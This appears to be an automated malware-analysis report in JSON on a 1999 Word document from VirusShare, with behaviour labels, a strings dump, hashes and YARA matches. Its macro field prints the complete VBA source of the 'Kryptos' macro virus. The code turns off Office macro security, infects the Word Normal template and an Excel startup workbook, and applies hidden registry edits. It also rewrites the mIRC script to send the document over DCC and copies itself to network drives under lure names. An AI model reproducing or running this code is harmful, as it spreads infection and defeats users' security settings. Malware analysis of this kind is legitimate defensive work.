{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "ActiveWorkbook.SaveAs": "May save the current workbook",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CreateObject": "May create an OLE object",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Workbook_Activate": "Runs when the Excel Workbook is opened",
            "codemodule": "May attempt to modify the VBA code",
            "vbHide": "May run an executable file or a system command"
        },
        "macro": "Sub Document_Close()\nOn Error Resume Next\n'Kryptos\nOptions.SaveNormalPrompt = 0\nOptions.SendMailAttach = 1\nOptions.ConfirmConversions = 0\nIf System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") <> \"\" Then\nCommandBars(\"Macro\").Controls(\"Security...\").Enabled = False\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Excel\\Security\", \"Level\") = 1\nElse\nCommandBars(\"Tools\").Controls(\"Macro\").Enabled = 0\nOptions.VirusProtection = 0\nEnd If\nSet glob = NormalTemplate.VBProject.VBComponents(1).codemodule\nSet curr = ActiveDocument.VBProject.VBComponents(1).codemodule\nIf glob.Lines(3, 1) <> \"'Kryptos\" Then\nglob.DeleteLines 1, glob.CountOfLines\nglob.InsertLines 2, curr.Lines(2, curr.CountOfLines)\nglob.InsertLines 1, \"Sub Document_Open()\"\nglob.replaceline 45, \"Sub Workbook_Deactivate\": glob.replaceline 101, \"Sub FileExit()\"\nEnd If\nIf curr.Lines(3, 1) <> \"'Kryptos\" Then\ncurr.DeleteLines 1, curr.CountOfLines\ncurr.InsertLines 2, glob.Lines(2, glob.CountOfLines)\ncurr.InsertLines 1, \"Sub Document_Close()\"\ncurr.replaceline 45, \"Sub Workbook_Activate()\": curr.replaceline 101, \"Sub Dodo()\"\nKill \"c:\\mirc\\script.ini\": Open \"c:\\mirc\\script.ini\" For Output As 1: Print #1, \"[script]\": Print #1, \"n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\\Passwords.rtf }\"\nPrint #1, \"n1=on 1:CONNECT: {\": Close 1\nEnd If\nSet xlApp = CreateObject(\"Excel.Application\")\nIf UCase(Dir(xlApp.Application.StartupPath + \"\\Book1.\")) <> UCase(\"BOOK1\") Then\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel\", \"Options6\") = \"\"\nSystem.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office\", \"CodeForeColors\") = \"1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0\"\nSet Book1Obj = xlApp.Workbooks.Add\nBook1Obj.VBProject.VBComponents.Item(\"ThisWorkbook\").codemodule.InsertLines 1, glob.Lines(1, glob.CountOfLines)\nBook1Obj.VBProject.VBComponents.Item(\"ThisWorkbook\").codemodule.replaceline 45, \"Sub Workbook_Deactivate()\"\nBook1Obj.SaveAs xlApp.Application.StartupPath & \"\\Book1.\"\nBook1Obj.Close\nMze$ = ActiveDocument.FullName: ActiveDocument.SaveAs FileName:=\"c:\\passwords.rtf\", LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False\nActiveDocument.SaveAs FileName:=Mze$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False\nEnd If\nEnd Sub\n   \nSub Workbook_Activate()\nOn Error Resume Next\nSet aw = ActiveWorkbook.VBProject.VBComponents(\"ThisWorkbook\").codemodule\nSet tw = ThisWorkbook.VBProject.VBComponents(\"ThisWorkbook\").codemodule\ntw.replaceline 45, \"Sub Workbook_Deactivate\": tw.replaceline 101, \"Sub Disabled()\"\nIf aw.Lines(3, 1) <> \"'Kryptos\" Then\naw.DeleteLines 1, aw.CountOfLines\naw.InsertLines 1, tw.Lines(1, tw.CountOfLines)\nEnd If\nIf UCase(Dir(Application.StartupPath + \"\\Book1.\")) <> \"BOOK1\" Then\nActiveWorkbook.SaveAs Excel.Application.StartupPath & \"\\Book1.\"\nOpen \"c:\\Kryptos.reg\" For Output As 1\nPrint #1, \"REGEDIT4\"\nPrint #1, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel]\"\nPrint #1, \"\"\"Options6\"\"=dword:00000000\"\nPrint #1, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Excel\\Security]\"\nPrint #1, \"\"\"Level\"\"=dword:00000001\"\nPrint #1, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office]\"\nPrint #1, \"\"\"CodeForeColors\"\"=\"\"1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0 \"\"\"\nPrint #1, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office]\"\nPrint #1, \"\"\"CodeBackColors\"\"=\"\"1 1 0 7 6 0 0 0 0 0 0 0 0 0 0 0 \"\"\"\nReset\nOpen \"c:\\index.html\" For Output As 1\nPrint #1, \"<html><head><title>Kryptos</title></head><body><center> \"\nPrint #1, \"Met a girl in the rain<br>\"\nPrint #1, \"waiting for a train<br>\"\nPrint #1, \"I said I missed my plane<br>\"\nPrint #1, \"She said I guess you'll have to stay with me<br>\"\nPrint #1, \"Do you live far away<br>\"\nPrint #1, \"Sometimes it's hard to say<br>\"\nPrint #1, \"She said look it's starting to snow<br>\"\nPrint #1, \"and god I want to go where the sun goes<br>\"\nPrint #1, \"where the sun goes<br>\"\nPrint #1, \"But she's so cold<br>\"\nPrint #1, \"she's so cold<br><p>\"\nPrint #1, \"<br>KrYpToS<i> - Welcome to a new age</i><br></html>\"\nClose 1\nShell \"regedit /s c:\\Kryptos.reg\", vbHide\nSet WordObj = GetObject(, \"Word.Application\")\nIf WordObj = \"\" Then\nSet WordObj = CreateObject(\"Word.Application\")\ncrossQuit = True\nEnd If\nEnd If\nSet glob = WordObj.NormalTemplate.VBProject.VBComponents(1).codemodule\nWordObj.Options.SaveNormalPrompt = False\nglob.DeleteLines 1, glob.CountOfLines\nglob.InsertLines 1, tw.Lines(1, tw.CountOfLines)\nglob.replaceline 1, \"Sub Document_Open\"\nglob.Save\nIf crossQuit = True Then\nWordObj = \"\"\nWordObj.Quit\nEnd If\nEnd Sub\n\nSub Dodo()\nOn Error Resume Next\nRandomize\n  fe = Int(Rnd * 7) + 1\n  If fe = 1 Then fet$ = \"YearlyReport.rtf\"\n  If fe = 3 Then fet$ = \"Costcutting.rtf\"\n  If fe = 2 Then fet$ = \"Readme.rtf\"\n  If fe = 4 Then fet$ = \"Secret.rtf\"\n  If fe = 5 Then fet$ = \"FinanceRep.rtf\"\n  If fe = 6 Then fet$ = \"NetworkSecurity\" & Now & \".rtf\"\n  If fe = 7 Then fet$ = \"Passwords.rtf\"\nChangeFileOpenDirectory \"h:\"\nActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False\nChangeFileOpenDirectory \"m:\"\nActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False\nChangeFileOpenDirectory \"z:\"\nActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False\nChangeFileOpenDirectory \"C:\"\nApplication.Quit\nEnd If\n\nEnd Sub\n\n\n\n\n\n\n\n\n\n\n\n"
    },
    "filename": "VirusShare_293b7760542f9aad594c681ca0643d5d",
    "filesize": 35840,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: d, Template: Normal, Last Saved By: d, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 02:00, Create Time/Date: Tue Jul 13 22:15:00 1999, Last Saved Time/Date: Tue Jul 13 22:18:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "293b7760542f9aad594c681ca0643d5d",
        "sha1": "36ae17dd0de3c1f84cf5af7cd78de553aebe0f70",
        "sha256": "0e48378ab3c4d956bc09b52eb5fb62dcf97a304043183221f40b663bc51f580a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "@T3u\u037e",
            "/ =!",
            "m7Fm7F",
            "Normal",
            "Microsoft Word 8.0",
            "7/u\u037e",
            "Intermission",
            "Title",
            "_PID_GUID",
            "@T3u\u037e",
            ":3u\u037e",
            "@T3u\u037e",
            ":3u\u037e",
            "gK3u\u037e",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "Sub ",
            "Error Re",
            "~ Next",
            "'Krypto",
            "ptions .Save",
            "PrPompt",
            "e@ndMail",
            "firm",
            "If System.P",
            ",fileSn",
            "g(\"\", \"H",
            "KEY_CURR",
            "ENT_USER@\\Softw\\@Micros",
            "Office\\9",
            ".0\\Word\\",
            "Security",
            " Level\")",
            " <> \"\" T",
            "mandBars",
            "(\"Ma",
            "\").a'trol@",
            "cDss,,= @Q",
            "ExcelH",
            "EHToEH",
            "G\u0202 Virusrte",
            "{End I",
            "Set g8lob@",
            "C\u0173.V:B",
            "n@s(1).c",
            "odemodulW",
            "nes(3, 1",
            "DeleteB",
            "D untOf",
            "Insert",
            "82, ",
            "\"sOp0en()B",
            "re@~6`",
            " 45ba",
            "@]kbook_Dea!!",
            "h\":c",
            "F`kExit",
            "Dodo!Kil",
            "l \"c:\\mi",
            "rc\\script.ini)",
            " F`Outpu",
            "t As 1: nt #a",
            "n0=on",
            "JOIN:#: if ( $",
            "!= $nick",
            " ) { /dc8c sd",
            "ssw s.rtXf } ",
            "ONNECT: ",
            "%nxlApp",
            "gBeObm",
            "(\". ",
            "lica",
            "v\" TBUC`(Dir(",
            "StartupP",
            "ath + \"\\:BP1bi",
            "\"BpOOK1 c\u07d8K?%8 ",
            "0SLfVBA",
            " eColo",
            "1 1 5 0P",
            "u<s.Add",
            "LP.I",
            "R.7(7",
            "8p\tI6",
            "`3%%",
            "\\`Fully!: ",
            ">p5p",
            "Lock#",
            "1s:=",
            "ToRech",
            "ReadOnly",
            ";edD",
            "   v",
            "bQ_PuawF",
            "((_(|zt",
            "oDisrR(Maw/4% ",
            "UWUU$UT-",
            "&bPZZ",
            "g\"mm",
            "fREGEDIT4LX",
            "[OOK[[]K",
            "\"\"v\\\"=do:0",
            "c\"=\"\"cc \"\"?",
            "@6BaN\"l5",
            "0 7 6k7",
            "peB#in",
            "dex.html##<!",
            "><h@S",
            "><title>I'</",
            "b ody><Ver",
            "`*(M ta gi",
            "rl in th",
            "e rain<b",
            "waiti",
            "ng fPa t",
            "int #1, ",
            "\"I said ",
            "I missed",
            " my plan",
            "e<br>\"",
            "uess you",
            "'ll have",
            " to stay with m",
            "zDDo",
            "^ li",
            "Xfar away",
            "ometimes  it's",
            "look",
            "rting",
            "`and g2o",
            "[go` wher",
            "a'u2n",
            "Bu t she",
            "\\so` cold",
            "KrYpT",
            "oS<i> - 0Welc",
            "new age<",
            "</ht",
            "ml Close0 1",
            "egedit /",
            "s c:\\Kry ptos.",
            "\", vbHide",
            "et WordO",
            "bj = Geta",
            "ect(",
            "Applicat",
            "ion\")",
            "\"\" The",
            "Create",
            "cross",
            "Qu&= Tru!EdIf",
            "S%glob$",
            ".Normal",
            "Temte.V`BProj*@",
            "omponent",
            "s(1).codemodul",
            "OpA0s.S",
            ".DeleteLin@@",
            "CountOf",
            "Insert\ttw.",
            "re@-c",
            " @\t\"Sub Docum",
            "-_Open",
            "(\u07c2YHZ",
            "\"On E",
            "rror Res",
            " Next",
            "BRaomiz@  ",
            "Int(",
            "R1* 7) +I  >b",
            "Yearl",
            "yReport.Xrtf@",
            "CostcutasN",
            "Readme",
            "Secre",
            "Finan,ce`",
            "Ne twork",
            "ity\" & NTow",
            "Phass@",
            "dkb C",
            "hangeFil\"eA;DirTor y \"h: $Act ?BRAs ",
            "Name:=ze",
            "t$, Lock#Z",
            "Ds:=T, ",
            "AddToRec\u03e0F",
            "!&OnA1`",
            "}.Klml",
            "7568",
            "rary",
            "Kryptos",
            "0046",
            "rogr",
            "mon ",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "Security...",
            "Macro",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Excel\\Security",
            "Level",
            "Macro",
            "Tools",
            "'Kryptos",
            "Sub Document_Open()",
            "Sub Workbook_Deactivate",
            "Sub FileExit() ",
            "'Kryptos",
            "Sub Document_Close() ",
            "Sub Workbook_Activate()",
            "Sub Dodo() ",
            "c:\\mirc\\script.iniA@H",
            "c:\\mirc\\script.ini",
            "[script]",
            "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\\Passwords.rtf }",
            "n1=on 1:CONNECT: {",
            "Excel.Application",
            "\\Book1.",
            "BOOK1",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel",
            "Options6 ",
            "1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office",
            "CodeForeColors ",
            "ThisWorkbook ",
            "Sub Workbook_Deactivate()",
            "ThisWorkbook ",
            "\\Book1.",
            "c:\\passwords.rtf",
            "ThisWorkbook ",
            "ThisWorkbook ",
            "Sub Workbook_Deactivate",
            "Sub Disabled() ",
            "'Kryptos",
            "Formh",
            "\\Book1.",
            "BOOK1",
            "\\Book1.",
            "c:\\Kryptos.reg",
            "VBE\\",
            "REGEDIT4",
            "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\8.0\\Excel\\Microsoft Excel]",
            "\"Options6\"=dword:00000000",
            "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Excel\\Security]",
            "\"Level\"=dword:00000001",
            "[HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office]",
            "\"CodeForeColors\"=\"1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0 \"",
            "%ed%e",
            "[HKEY_CURRENT_USER\\Software\\Microsoft\\VBA\\Office]",
            "\"CodeBackColors\"=\"1 1 0 7 6 0 0 0 0 0 0 0 0 0 0 0 \"",
            "%et%eA@v",
            "c:\\index.html",
            "<html><head><title>Kryptos</title></head><body><center> ",
            "Met a girl in the rain<br>",
            "waiting for a train<br>",
            "I said I missed my plane<br>",
            "%eT%e",
            "She said I guess you'll have to stay with me<br>",
            "Do you live far away<br>",
            "Sometimes it's hard to say<br>",
            "She said look it's starting to snow<br>",
            "and god I want to go where the sun goes<br>",
            "where the sun goes<br>",
            "But she's so cold<br>",
            "she's so cold<br><p>",
            "<br>KrYpToS<i> - Welcome to a new age</i><br></html>",
            "regedit /s c:\\Kryptos.reg",
            "Word.Application$",
            "Word.Application$",
            "Sub Document_Open",
            "YearlyReport.rtf' ",
            "Costcutting.rtf",
            "Readme.rtf' ",
            "Secret.rtf' ",
            "FinanceRep.rtf' ",
            "NetworkSecurity",
            ".rtf",
            "Passwords.rtf",
            "h:A@",
            "m:A@",
            "z:A@",
            "C:A@",
            "Attribut",
            "e VB_Nam",
            "e = \"S",
            "19378bac76",
            "'[p9",
            "Wordk",
            "Win16~",
            "Win32",
            "Project1",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Options",
            "SaveNormalPrompt\u02bc",
            "SendMailAttach[",
            "ConfirmConversions",
            "Systema",
            "PrivateProfileString[",
            "CommandBars",
            "ControlsK",
            "Enabled\u06ea",
            "VirusProtectionoD",
            "glob:",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "codemodule",
            "curr#",
            "ActiveDocument\\",
            "Lines",
            "DeleteLines",
            "CountOfLines!\\",
            "InsertLines",
            "replaceline",
            "Kill",
            "xlApp\u0172",
            "CreateObject",
            "UCase5",
            "Application*",
            "StartupPathi",
            "Book1Obj",
            "WorkbooksB",
            "Addr",
            "Itemz",
            "SaveAsf;",
            "MzeR",
            "FullName\u041e",
            "FileNamej",
            "LockComments'",
            "AddToRecentFilesV",
            "ReadOnlyRecommended",
            "Workbook_Deactivate",
            "ActiveWorkbook",
            "twO_",
            "ThisWorkbook|",
            "Excel+",
            "Reset",
            "ShellV",
            "vbHideW",
            "WordObjq1",
            "GetObjectz",
            "crossQuit",
            "Save",
            "Quit9",
            "FileExitJ",
            "fe8]",
            "RndR",
            "Now%",
            "ChangeFileOpenDirectory",
            "FUCK.",
            "Document_Close7\\",
            "Workbook_Activateg",
            "Dodo",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#D:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F945A",
            "36E2-1C0",
            "9-11D3-9",
            "29E-F0BA",
            "9FD07568",
            "3.TWD#M",
            "icrosoft ",
            "` Ob",
            " LibraryG",
            "PFC2317(63-",
            "PB460893CE",
            "PJP\\VBE\\\t(EX(.E",
            "CxN@UTalCxNTax",
            " +\t,C",
            "icDO@f",
            "2DF8D04C",
            "-5BFA-101B-BDE5@TAA@4",
            "ROGRAM F",
            "ILES\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCHk# 8.0k",
            "ThisDocu ment",
            "h@6s",
            "\"DIc",
            "ThisDocument",
            "ID=\"{5BEC279E-3970-11D3-929E-9F9D88525D06}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"6D6FB4254C9650965096509650\"",
            "DPB=\"DAD803DC71DD71DD71\"",
            "GC=\"47459E73668DD28ED28E2D\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=88, 88, 716, 548, Z",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "Costcutting.rtf": "Text",
            "Passwords.rtf": "Text",
            "c:\\Kryptos.reg": "Registry",
            "c:\\passwords.rtf": "Text",
            "regedit /s c:\\Kryptos.reg": "Registry"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.316646",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
